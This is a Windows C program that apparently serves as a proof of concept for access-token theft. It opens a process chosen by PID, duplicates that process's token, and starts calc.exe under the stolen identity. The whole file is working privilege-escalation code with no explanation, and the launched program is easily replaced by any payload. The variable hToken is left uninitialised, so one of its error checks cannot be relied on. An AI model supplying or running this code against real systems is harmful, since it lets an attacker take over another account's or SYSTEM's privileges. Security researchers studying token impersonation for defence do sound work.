#include <windows.h>
#include <stdio.h>

int main(int argc, char * argv[]) {
    HANDLE hProcess = NULL;
    HANDLE hToken, hDuplicateToken = NULL;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    DWORD pid;

    wchar_t cmdline[] = L"C:\\Windows\\System32\\calc.exe";

    // Initialize the STARTUPINFOW and PROCESS_INFORMATION structures
    ZeroMemory(&si, sizeof(STARTUPINFOW));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    si.cb = sizeof(STARTUPINFOW);

    // Check the number of parameters
    if (argc < 2) {
        return EXIT_FAILURE;
    }

    pid = atoi(argv[1]);
    int debug = 1;

    // Get a handle to the target process for which we are trying to obtain an access token
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);
    if (hProcess == NULL) {
        if (debug) {printf("OpenProcess failed with error %d\n", GetLastError());}
        return EXIT_FAILURE;
    }

    // Get a handle to the access token for the process
    OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken);
    if (hToken == NULL) {
        if (debug) {printf("OpenProcessToken failed with error %d\n", GetLastError());}
        return EXIT_FAILURE;
    }

    // Create a new access token that duplicates an existing token
    DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDuplicateToken);
    if (hDuplicateToken == NULL) {
        if (debug) {printf("DuplicateTokenEx failed with error %d\n", GetLastError());}
        return EXIT_FAILURE;
    }

    // Create a new process and its primary thread with a specified token
    CreateProcessAsUserW(hDuplicateToken, NULL, cmdline, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

    if (pi.hProcess == NULL) {
        if (debug) {printf("CreateProcessAsUserW failed with error %d\n", GetLastError());}
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}
